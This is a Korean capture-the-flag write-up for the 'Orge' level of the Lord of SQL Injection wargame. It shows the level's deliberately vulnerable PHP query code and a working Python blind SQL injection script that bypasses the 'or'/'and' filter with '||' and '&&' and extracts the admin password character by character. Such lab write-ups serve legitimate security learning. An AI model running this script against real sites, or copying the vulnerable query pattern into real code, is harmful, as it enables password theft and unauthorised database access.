# Lord of SQL Injection No.7 - Orge
## 문제 출제 의도
1. 'and', 'or' 없이 Blind SQL Injection의 가능 여부 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - GET방식으로 입력받은 pw값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 받은 pw값에 "or", "and"중 하나라도 있다면 "HeHe"가 출력되고 문제풀이에 실패한다.
+ 풀이 성공 조건
    - 입력한 pw와 데이터 베이스에서 받아 온 실제 pw가 같아야 한다.
## 문제 해결
1. Blind SQL Injection
    - 다음과 유사한 코드로 pw 값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote
    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
            data="' || id='admin' && substr(pw,1,{})='{}'#".format(str(i), key + chr(j))
            print(data)

            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=uavhq5il3tafpfo9kr7uiqusu4")

            res = urllib.request.urlopen(re)

            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 이는 "6c864dec" 출력한다.
    - "6c864dec"을 GET방식으로 pw에 입력하면 문제 풀이에 성공한다.